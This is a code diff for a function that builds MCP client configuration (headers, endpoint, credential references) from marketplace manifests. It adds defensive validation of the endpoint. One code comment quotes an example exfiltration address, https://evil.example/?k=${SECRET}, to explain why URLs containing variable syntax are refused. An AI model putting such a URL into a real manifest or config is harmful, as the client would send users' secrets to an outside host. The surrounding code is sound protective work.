@@ -40,19 +40,99 @@ export function mcpClientConfigKey(manifest: {
   return `${(fallback || "server").slice(0, MAX_KEY_LENGTH - 5).replace(/-+$/, "")}-${stableSuffix(manifest.identifier)}`;
 }
 
-function authHeaders(auth: MarketMcpManifest["auth"]) {
+/** Clients whose config shape and variable syntax this file knows. */
+export type McpClientId = "claude-code" | "cursor" | "generic";
+
+export type McpClientConfigOptions = {
+  client?: McpClientId;
+  /**
+   * The name of an environment variable that holds the credential. The
+   * config then refers to it the way `client` spells it instead of carrying
+   * a placeholder; the value itself never passes through here.
+   */
+  keyEnv?: string;
+};
+
+const HEADER_NAME = /^[\w-]{1,100}$/;
+
+/**
+ * The endpoint as a config will carry it, or null when it must not be put in
+ * one. Clients expand `${VAR}` in a config's `url` and `headers`, so an
+ * address a catalog entry gave as `https://evil.example/?k=${SECRET}` would
+ * make the client send the user's secret away: anything with `$`, `{` or `}`
+ * (also percent-encoded) is refused. Only https, without credentials or a
+ * fragment, is accepted. The returned string is the normalised URL, and the
+ * only form of the endpoint the guide shows and the config holds.
+ */
+export function mcpConfigEndpoint(value: string | null | undefined) {
+  if (!value) return null;
+  try {
+    const url = new URL(value);
+    if (url.protocol !== "https:" || url.username || url.password || url.hash) {
+      return null;
+    }
+    const href = url.toString();
+    if (/[`${}]|%7[bd]|%60/i.test(value) || /[`${}]|%7[bd]|%60/i.test(href)) return null;
+    return href;
+  } catch {
+    return null;
+  }
+}
+
+/** How `client` refers to an environment variable inside its config file. */
+function envReference(client: McpClientId, name: string) {
+  return client === "cursor" ? `\${env:${name}}` : `\${${name}}`;
+}
+
+function credentialValue(
+  client: McpClientId,
+  keyEnv: string | undefined,
+  placeholder: string,
+  prefix = "",
+) {
+  return keyEnv === undefined
+    ? `${prefix}${placeholder}`
+    : `${prefix}${envReference(client, keyEnv)}`;
+}
+
+function authHeaders(
+  auth: MarketMcpManifest["auth"],
+  client: McpClientId,
+  keyEnv: string | undefined,
+): Record<string, string> {
   switch (auth.type) {
     case "bearer":
-      return { [auth.headerName ?? "Authorization"]: "Bearer <YOUR_TOKEN>" };
+      return {
+        [auth.headerName ?? "Authorization"]: credentialValue(
+          client,
+          keyEnv,
+          "<YOUR_TOKEN>",
+          "Bearer ",
+        ),
+      };
     case "api_key_header":
-      return { [auth.headerName ?? "X-API-Key"]: "<YOUR_API_KEY>" };
+      return {
+        [auth.headerName ?? "X-API-Key"]: credentialValue(
+          client,
+          keyEnv,
+          "<YOUR_API_KEY>",
+        ),
+      };
     case "custom_headers": {
       const names = auth.allowedHeaderNames.length
         ? auth.allowedHeaderNames
         : auth.headerName
           ? [auth.headerName]
           : [];
-      return Object.fromEntries(names.map((name) => [name, "<VALUE>"]));
+      // One variable cannot stand for several different secrets: with more
+      // than one header the values stay placeholders to fill in by hand.
+      const single = names.length === 1 ? keyEnv : undefined;
+      return Object.fromEntries(
+        names.map((name) => [
+          name,
+          credentialValue(client, single, "<VALUE>"),
+        ]),
+      );
     }
     default:
       // OAuth is negotiated by the client at connect time; no static header.
@@ -61,24 +141,46 @@ function authHeaders(auth: MarketMcpManifest["auth"]) {
 }
 
 /**
- * Generic `mcpServers` client config for a remote server, with credential
- * placeholders only. Returns null for STDIO servers: the manifest carries no
- * launch command, so there is nothing truthful to print.
+ * The `mcpServers` config for a remote server as an object. Credentials are
+ * placeholders, or, with `keyEnv`, a reference to that environment variable.
+ * Null for STDIO servers: the manifest carries no launch command, so there
+ * is nothing truthful to print. A header name that is not a plain token is
+ * left out rather than echoed.
  */
-export function remoteMcpClientConfig(manifest: MarketMcpManifest) {
-  if (manifest.transport === "stdio" || !manifest.endpointUrl) {
+export function remoteMcpClientConfigObject(
+  manifest: MarketMcpManifest,
+  options: McpClientConfigOptions = {},
+) {
+  const endpoint =
+    manifest.transport === "stdio" ? null : mcpConfigEndpoint(manifest.endpointUrl);
+  if (!endpoint) {
     return null;
   }
-  const headers = authHeaders(manifest.auth);
+  const client = options.client ?? "generic";
+  const headers = Object.fromEntries(
+    Object.entries(authHeaders(manifest.auth, client, options.keyEnv)).filter(
+      ([name]) => HEADER_NAME.test(name),
+    ),
+  );
   const server = {
-    type:
-      manifest.transport === "streamable_http" ? "http" : "sse",
-    url: manifest.endpointUrl,
+    // Cursor infers the transport from the URL and takes no `type`.
+    ...(client === "cursor"
+      ? {}
+      : { type: manifest.transport === "streamable_http" ? "http" : "sse" }),
+    url: endpoint,
     ...(Object.keys(headers).length > 0 ? { headers } : {}),
   };
-  return JSON.stringify(
-    { mcpServers: { [mcpClientConfigKey(manifest)]: server } },
-    null,
-    2,
-  );
+  return { mcpServers: { [mcpClientConfigKey(manifest)]: server } };
+}
+
+/**
+ * Generic `mcpServers` client config for a remote server, as JSON text.
+ * Returns null for STDIO servers (see `remoteMcpClientConfigObject`).
+ */
+export function remoteMcpClientConfig(
+  manifest: MarketMcpManifest,
+  options: McpClientConfigOptions = {},
+) {
+  const config = remoteMcpClientConfigObject(manifest, options);
+  return config ? JSON.stringify(config, null, 2) : null;
 }
